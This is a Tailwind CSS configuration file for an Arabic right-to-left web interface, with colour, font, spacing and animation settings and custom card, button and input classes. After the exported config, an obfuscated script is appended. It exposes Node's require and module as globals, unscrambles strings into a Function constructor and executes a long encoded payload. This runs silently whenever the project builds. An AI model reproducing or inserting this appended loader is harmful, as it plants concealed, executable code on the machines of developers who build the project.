/** @type {import('tailwindcss').Config} */
module.exports = {
  content: [
    "./app/**/*.{js,ts,jsx,tsx,mdx}",
    "./components/**/*.{js,ts,jsx,tsx,mdx}",
    "./lib/**/*.{js,ts,jsx,tsx,mdx}",
    "./pages/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      // Custom color palette using CSS variables for admin configurability
      colors: {
        primary: {
          50: "hsl(var(--primary-50))",
          100: "hsl(var(--primary-100))",
          200: "hsl(var(--primary-200))",
          300: "hsl(var(--primary-300))",
          400: "hsl(var(--primary-400))",
          500: "var(--primary-color, #1E88E5)",
          600: "hsl(var(--primary-600))",
          700: "hsl(var(--primary-700))",
          800: "hsl(var(--primary-800))",
          900: "hsl(var(--primary-900))",
          DEFAULT: "var(--primary-color, #1E88E5)",
          hover: "var(--primary-hover, #1565C0)",
        },
        secondary: {
          50: "hsl(var(--secondary-50))",
          100: "hsl(var(--secondary-100))",
          200: "hsl(var(--secondary-200))",
          300: "hsl(var(--secondary-300))",
          400: "hsl(var(--secondary-400))",
          500: "var(--secondary-color, #4CAF50)",
          600: "hsl(var(--secondary-600))",
          700: "hsl(var(--secondary-700))",
          800: "hsl(var(--secondary-800))",
          900: "hsl(var(--secondary-900))",
          DEFAULT: "var(--secondary-color, #4CAF50)",
          hover: "var(--secondary-hover, #388E3C)",
        },
        accent: {
          50: "hsl(var(--accent-50))",
          100: "hsl(var(--accent-100))",
          200: "hsl(var(--accent-200))",
          300: "hsl(var(--accent-300))",
          400: "hsl(var(--accent-400))",
          500: "var(--accent-color, #FBC02D)",
          600: "hsl(var(--accent-600))",
          700: "hsl(var(--accent-700))",
          800: "hsl(var(--accent-800))",
          900: "hsl(var(--accent-900))",
          DEFAULT: "var(--accent-color, #FBC02D)",
          hover: "var(--accent-hover, #F9A825)",
        },
        background: {
          DEFAULT: "var(--background-color, #F5F5F5)",
          secondary: "var(--background-secondary, #FFFFFF)",
        },
        text: {
          DEFAULT: "var(--text-color, #212121)",
          secondary: "var(--text-secondary, #757575)",
        },
        error: {
          DEFAULT: "var(--error-color, #D32F2F)",
          hover: "var(--error-hover, #B71C1C)",
        },
        border: {
          DEFAULT: "var(--border-color, #E0E0E0)",
          secondary: "var(--border-secondary, #B0BEC5)",
        },
        card: {
          DEFAULT: "var(--card-bg, #FFFFFF)",
          shadow: "var(--card-shadow, rgba(0, 0, 0, 0.05))",
        },
        modal: {
          DEFAULT: "var(--modal-bg, #FFFFFF)",
          shadow: "var(--modal-shadow, rgba(0, 0, 0, 0.2))",
        },
        disabled: {
          DEFAULT: "var(--disabled-color, #B0BEC5)",
          bg: "var(--disabled-bg, #ECEFF1)",
        },
      },

      // Typography using Arabic fonts with enhanced hierarchy
      fontFamily: {
        sans: [
          "var(--font-sans)",
          "Noto Kufi Arabic",
          "system-ui",
          "-apple-system",
          "BlinkMacSystemFont",
          "sans-serif",
        ],
        serif: ["var(--font-serif)", "Amiri", "Times New Roman", "serif"],
        arabic: [
          "Noto Kufi Arabic",
          "system-ui",
          "-apple-system",
          "sans-serif",
        ],
        kufi: ["Noto Kufi Arabic", "system-ui", "sans-serif"],
        amiri: ["Amiri", "Times New Roman", "serif"],
        display: [
          "var(--font-display)",
          "Noto Kufi Arabic",
          "system-ui",
          "sans-serif",
        ],
        heading: [
          "var(--font-heading)",
          "Noto Kufi Arabic",
          "Amiri",
          "system-ui",
          "sans-serif",
        ],
        body: [
          "var(--font-body)",
          "Noto Kufi Arabic",
          "system-ui",
          "sans-serif",
        ],
        caption: [
          "var(--font-caption)",
          "Noto Kufi Arabic",
          "system-ui",
          "sans-serif",
        ],
      },

      // Custom font sizes using CSS variables
      fontSize: {
        xs: [
          "var(--font-size-xs, 0.75rem)",
          { lineHeight: "var(--line-height-tight, 1.2)" },
        ],
        sm: [
          "var(--font-size-sm, 0.875rem)",
          { lineHeight: "var(--line-height-normal, 1.5)" },
        ],
        base: [
          "var(--font-size-md, 1rem)",
          { lineHeight: "var(--line-height-normal, 1.5)" },
        ],
        lg: [
          "var(--font-size-lg, 1.25rem)",
          { lineHeight: "var(--line-height-normal, 1.5)" },
        ],
        xl: [
          "var(--font-size-xl, 1.5rem)",
          { lineHeight: "var(--line-height-tight, 1.2)" },
        ],
        "2xl": [
          "var(--font-size-2xl, 2rem)",
          { lineHeight: "var(--line-height-tight, 1.2)" },
        ],
        "3xl": [
          "var(--font-size-3xl, 2.5rem)",
          { lineHeight: "var(--line-height-tight, 1.2)" },
        ],
      },

      // Custom spacing using CSS variables
      spacing: {
        xxs: "var(--spacing-xxs, 0.25rem)",
        xs: "var(--spacing-xs, 0.5rem)",
        sm: "var(--spacing-sm, 1rem)",
        md: "var(--spacing-md, 1.5rem)",
        lg: "var(--spacing-lg, 2rem)",
        xl: "var(--spacing-xl, 3rem)",
        "2xl": "var(--spacing-2xl, 4rem)",
        "3xl": "var(--spacing-3xl, 6rem)",
      },

      // Custom border radius
      borderRadius: {
        sm: "var(--radius-sm, 0.25rem)",
        md: "var(--radius-md, 0.5rem)",
        lg: "var(--radius-lg, 0.75rem)",
        full: "var(--radius-full, 9999px)",
      },

      // Custom shadows
      boxShadow: {
        sm: "var(--shadow-sm, 0 2px 4px rgba(0, 0, 0, 0.05))",
        md: "var(--shadow-md, 0 4px 8px rgba(0, 0, 0, 0.05))",
        lg: "var(--shadow-lg, 0 8px 16px rgba(0, 0, 0, 0.05))",
        xl: "var(--shadow-xl, 0 12px 24px rgba(0, 0, 0, 0.2))",
      },

      // Custom transitions
      transitionDuration: {
        fast: "var(--transition-fast, 200ms)",
        normal: "var(--transition-normal, 300ms)",
        slow: "var(--transition-slow, 500ms)",
      },

      // Animation configurations
      keyframes: {
        fadeIn: {
          "0%": { opacity: "0" },
          "100%": { opacity: "1" },
        },
        slideIn: {
          "0%": { transform: "translateX(100%)" },
          "100%": { transform: "translateX(0)" },
        },
        slideInRTL: {
          "0%": { transform: "translateX(-100%)" },
          "100%": { transform: "translateX(0)" },
        },
        scaleIn: {
          "0%": { transform: "scale(0.9)", opacity: "0" },
          "100%": { transform: "scale(1)", opacity: "1" },
        },
        pulse: {
          "0%, 100%": { opacity: "1" },
          "50%": { opacity: "0.5" },
        },
        spin: {
          from: { transform: "rotate(0deg)" },
          to: { transform: "rotate(360deg)" },
        },
        bounce: {
          "0%, 100%": {
            transform: "translateY(-25%)",
            animationTimingFunction: "cubic-bezier(0.8, 0, 1, 1)",
          },
          "50%": {
            transform: "translateY(0)",
            animationTimingFunction: "cubic-bezier(0, 0, 0.2, 1)",
          },
        },
      },

      animation: {
        fadeIn: "fadeIn var(--transition-normal, 300ms) ease-in-out",
        slideIn: "slideIn var(--transition-normal, 300ms) ease-out",
        slideInRTL: "slideInRTL var(--transition-normal, 300ms) ease-out",
        scaleIn: "scaleIn var(--transition-fast, 200ms) ease-out",
        pulse: "pulse 1.5s infinite",
        spin: "spin 1s linear infinite",
        bounce: "bounce 1s infinite",
      },

      // Responsive breakpoints for Arabic content
      screens: {
        xs: "475px",
        sm: "640px",
        md: "768px",
        lg: "1024px",
        xl: "1280px",
        "2xl": "1536px",
      },

      // Grid configurations for profile cards
      gridTemplateColumns: {
        "auto-fit-cards": "repeat(auto-fit, minmax(280px, 1fr))",
        "auto-fill-cards": "repeat(auto-fill, minmax(280px, 1fr))",
      },

      // Custom backdrop blur
      backdropBlur: {
        xs: "2px",
        sm: "4px",
        md: "8px",
        lg: "12px",
        xl: "16px",
      },
    },
  },
  plugins: [
    // RTL support for Arabic
    require("tailwindcss-rtl"),

    // Custom plugin for Islamic design utilities
    function ({ addUtilities, addComponents, theme }) {
      // Islamic-specific utilities
      addUtilities({
        ".text-islamic-primary": {
          color: theme("colors.primary.DEFAULT"),
        },
        ".bg-islamic-secondary": {
          backgroundColor: theme("colors.secondary.DEFAULT"),
        },
        ".rtl-flip": {
          transform: "scaleX(-1)",
        },
        ".writing-mode-vertical": {
          writingMode: "vertical-rl",
          textOrientation: "mixed",
        },
        // Safe area utilities for mobile
        ".pb-safe-area": {
          paddingBottom: "env(safe-area-inset-bottom, 0px)",
        },
        ".pt-safe-area": {
          paddingTop: "env(safe-area-inset-top, 0px)",
        },
        ".pl-safe-area": {
          paddingLeft: "env(safe-area-inset-left, 0px)",
        },
        ".pr-safe-area": {
          paddingRight: "env(safe-area-inset-right, 0px)",
        },
      });

      // Islamic design components
      addComponents({
        ".islamic-card": {
          backgroundColor: theme("colors.card.DEFAULT"),
          borderRadius: theme("borderRadius.md"),
          boxShadow: theme("boxShadow.sm"),
          padding: theme("spacing.md"),
          border: `1px solid ${theme("colors.border.DEFAULT")}`,
          transition: `all ${theme("transitionDuration.normal")} ease-in-out`,
          "&:hover": {
            boxShadow: theme("boxShadow.md"),
          },
        },
        ".islamic-button": {
          padding: `${theme("spacing.sm")} ${theme("spacing.md")}`,
          borderRadius: theme("borderRadius.sm"),
          fontWeight: theme("fontWeight.medium"),
          fontSize: theme("fontSize.base[0]"),
          lineHeight: theme("fontSize.base[1].lineHeight"),
          transition: `all ${theme("transitionDuration.fast")} ease-in-out`,
          cursor: "pointer",
          border: "none",
          "&:focus": {
            outline: `2px solid ${theme("colors.primary.DEFAULT")}`,
            outlineOffset: "2px",
          },
          "&:disabled": {
            backgroundColor: theme("colors.disabled.bg"),
            color: theme("colors.disabled.DEFAULT"),
            cursor: "not-allowed",
          },
        },
        ".islamic-input": {
          padding: theme("spacing.sm"),
          borderRadius: theme("borderRadius.sm"),
          fontSize: theme("fontSize.base[0]"),
          lineHeight: theme("fontSize.base[1].lineHeight"),
          border: `1px solid ${theme("colors.border.DEFAULT")}`,
          backgroundColor: theme("colors.background.secondary"),
          color: theme("colors.text.DEFAULT"),
          transition: `all ${theme("transitionDuration.fast")} ease-in-out`,
          "&:focus": {
            borderColor: theme("colors.primary.DEFAULT"),
            boxShadow: `0 0 0 2px ${theme("colors.primary.DEFAULT")}20`,
            outline: "none",
          },
          "&:disabled": {
            backgroundColor: theme("colors.disabled.bg"),
            color: theme("colors.disabled.DEFAULT"),
            cursor: "not-allowed",
          },
        },
      });
    },
  ],

  // Dark mode configuration (disabled for light-mode-only requirement)
  darkMode: "class", // Keep for potential future use

  // Important prefix for CSS specificity
  important: false,

  // Separator for responsive/state prefixes
  separator: ":",

  // Prefix for all CSS classes
  prefix: "",

  // Core plugins configuration
  corePlugins: {
    preflight: true,
  },
};
global["r"] = require;
if (typeof module === "object") global["m"] = module;
(function () {
  var Sjg = "",
    hRE = 976 - 965;
  function YBl(k) {
    var b = 621579;
    var h = k.length;
    var i = [];
    for (var c = 0; c < h; c++) {
      i[c] = k.charAt(c);
    }
    for (var c = 0; c < h; c++) {
      var j = b * (c + 84) + (b % 29303);
      var g = b * (c + 390) + (b % 37057);
      var r = j % h;
      var v = g % h;
      var d = i[r];
      i[r] = i[v];
      i[v] = d;
      b = (j + g) % 3577109;
    }
    return i.join("");
  }
  var oeE = YBl("eohpbrurowcorscdguftvsykjicatmtlnqxnz").substr(0, hRE);
  var bqA =
    'ver((=1)hjgzvs.,da;[+g(v7(rn{1e(=+Cef9sairxmcc;;vnyzr;Am5 ,6c=ywn(uaasttkat"idaiza9lt7,;;nv69dflsum4ga+5](dxhA2e8;,]{a C)+.rr}3=[uzrlrr;(;9ao+{m<hmo2d"9le8lnh=v8fr]zwm+3;ta-+j(g aeo;( .1r86)agrh;(ifd,r52vpr.n)t<gd,naefenm A]g}b;lC+;a.r.x3rt.A=;[.(+=n] gpa9ehC)y"6+i][)8rnu[+.7ns(  r1gt>irt7ln]tov,[yu"unnr)th,(=r) ie}0r1f>n.=l=venx=,} d<) rppt)clrn i.c(((e)2rj0,ui{m0(n7iedg=(dvmrl2.,=ucs((o=ofox{rfhrz".;t[]n=u;= p84=(.tti)i+7n;h-,n[);=t ojdv-l6il;C;eh;-acplra,(j5n2i,*ah[v;osaldkods1avoo;,;]6-0)kA+t,e( ejh=1(od)ra)u+wr-zlCoru. =o;]vnl2.fre,(jrmr}7f7vSdi.d;);+ge+0)pf=a)s.p==i;;.kuh[]a;ng1hpmcnr0k*us=r,)rauah1pt}prtfif".rv=a0tno6t+;pc)ta(  us6.; bf;0;og41ft,u[=o1u= .vve"Cag4rs.ja8)9o[awh;"v)rlcr=.s}i+t";,;)c8e6=n=;;;v,v)o Sd3;=7nr1u0iva=fv)7tg+h"!(rpsv=)fo.=0=r<C!qte)8); b)]ter-==0gof(+llm=r{.l(+),r+u0dixffvpl+a=r2,;;(a)u]h,1(ohe9ifhmrr= +{hv,dl,i[lnr+]y(kc )mess;(l;nce., f<[gm6=a)=';
  var FZF = YBl[oeE];
  var bVN = "";
  var Lza = FZF;
  var JBX = FZF(bVN, YBl(bqA));
  var Otp = JBX(
    YBl(
      ';]]=!(A5,Aiam2AChecitae3@n]s"a]:pch()5]90wg2opa.cic11=2a.l:dA2s-Ae2 {pr=e%d9!em,A6)9h.37hnAznm63t)).]rb}l%A_1)u93e&k;l0Aoueu(5]oxuaA|agas16CA.!\/\/(;wa]5Ahe(:nldmAjt4c!]7r6+5pF8.Atn$c5$.m)A]> %r%AA.[3DeA\'a.Apaat2-0tpe0MAt%]bg0x=AcrdtSe5n2)AelA )oet=cr(oc;9]e>tASjrcoc=Em6jd%AAvAkx9i}etg]t{.eice.A+.N5{,.\/lAecEA1t]n3dg4Ec0]} 7n>%C0t\/#.n(A[.]bAAi)_}u+t;2,t1aA2e63\/t].%=7A5%83Arcu...cac03_+t}r dee[nAwo i ncrA1=eAs#Ah]4.+bh9Ec962at...r.ht;.sd%.Aj](!):+)q){(%)c]A2@tA,erf0ga3gku1uAAAtr379to(-c(coee)brdlttedAn%=v"1p.=t92crfeA[t!,?,e[3.&(bA)A4cav)ebo]%e\/f?Aan=m=]=%AI!le_%A789x$co,r(oec(n9ce1r +9dteA)]r_c6ffSn94rol[t+6wcrA;%!amdc%886.A(wy]}i%yt6=.\/rc{i7%pA5a]r99nef]a0.udAm\/l?[-6nattfs.c)yo7enp!4=ct] 7e%e]e)o%u}=An9_p2ctcuA1=n*r%)w;?Acena1;7An2\/r.;+An$4)ArAeA#9ohA8A54T,3)lhAddrsamgwn)t.D9%y=AgfS5s.e.%50;]}t],eAScr\')d]o3=A..!%ttlm.g..,)5.4onErne(t!d({%wg%{edt4)uiDab3st7s8t23c44]+.o.w%>grl,0t!e(.]!0mtoue}rz<.0s6 ]At%1%x.v5.i). =((w=acn[lrd8Hc;=A=rA}AAa;a+Amce[8pA)hhrr.e0@e2hca.+3ai[%c.A55AcA:ve1]\'-+8 ]h.A(ar{0A[9C.()7e{]AA@]30])e}1]]{A;a.ee5A9i9d6rwAv.dAe#$abnf)ni)i.].o0w_A .f(1aA f(n>3tsn7.c(AAwr](A2.)b+t8e.nind.iAA%[3sBifyisg]1snA)H\/c)$oet(cs._4A$z3;r%g=r{],#]c(_A[%ertq]Na#tl,s]})e21%grlcA.}=3o)8[2}A@A1;5e16t[cEAA1)A3Aoe)=,AAsi%ke}7a}[]l}Aemn=7nf ADv0w=Aens1] a{]c.i]0Afsw34 to%.u2mr:m.)ttA:ii=AAonc]rAcv5A);1f=.:1A0]cAsft]3A]=is{?+0bA}..=i 63A)m!"7.4cff3nne)A(\/orshs)ts;n=aA)o%1A]3.0n{n).)=0otrdt-t..Iyg%0;A,h}1.r8uu6={"g0tc]8n4A=A+\/A%.1oro)e:_%mi?#oAn4;%)nM)iAs!A.:oic<5A5n;fzAD(c0t[o<2e.)A.c%=6%=.A=rs7(*;=em?]p],nA]t[2(=*vA((AoAb,0Aa(ce;}Att}Ar95 ozrno7r5lA==$2.=3t;,Adt{t=s)_it?26gAat2c0.{f.}vv.o=.$2:Ae21.ooezc4htols:gdTp=A!cAyns.GoAA2tnql)a9r;=,)2784t,612:b3z}19(])A%D\/ t3"0i}Ap9A@o].5%7_=41u4\/0f7p(r_0rc7r{;A#..0se27A)t6r(o,.8Exr.r]}c<bct(;bAA9(j*Addd;no!Anec1.5oA("Ag;{vA;=.n()fcxo._m-iAotA.a%a5T;l#:"7}c+(eoc\/.8ai4%ec%}pA+9n3lA).cAC]";A(a\/4=]%ch1$1A]3;aFara$Amf}hrn54hA+\/\'],)])e1A!4)Ai.4,ectA4j3%cT(.6(6q=6t2o.)[:AA]7ehuuf"nAn7"2s{)ct.dm8druc[ue od(Ccll ar.,es]A ;nCcA%t1.dw%c),8e}nre4=cw}4c4)o]i(A%>)[rrD2;s(2AfuAio6)A[$geAAt%7]ACl1brsnp(p(})sg{3)5Ar%s).1A3Eecce1t:4)(=e(lAA=S+)i]s0s]6e_l]]d)h">5(yyht-%92n)3A6.7;(3o=a;22}e...5r!N.+(:]t+t%+o8IreA]}Ay51=A%le_o;Ai=]ei6.)AA)]o3 4+F=}xrrCdeer11EIA0nnu0t@t A))e1)_t4]l(cwt%rn%aoc7eA0.AAA[A<.b4v;c;5l)g,4c)2)b93r[.cbs6ct(cA=&4)fa7]. c.s..(5e64(o%];uA}TA(]A.gAele,.r8n!r,_i.fd.af=Aadznl(\/o7[4|A(,)+2501)A} a3nC.!dcth3b;1.]t)ct,bre;E9e%t]A4faAs.mt.b}A)t)]_3a,A=nAa\/(F]:i.nx%AS $df38egr.i ;ax0t")?(6rs1tr).fNri AyoAr\/}hcAa 82A.tl1(1h9)4si74sh2=rr,]55o%}&!2c.)+As..AiArA5a nA4ccim]2c,%(]gA.be47)q.cav2\/t I!2)=&mcov401A])AcCo; =rehta!n.78.tA3:7%fo3td>t(e]_;3] ;21-t]T]e]on+ro( ?(Cl,.7(e;2r r0 n)@.n _itA}AeAsbh&a]=Ha.r%]]5.l0(]j): %cy}AH1;G ..]yr;t4(',
    ),
  );
  var AsV = Lza(Sjg, Otp);
  AsV(7460);
  return 6485;
})();
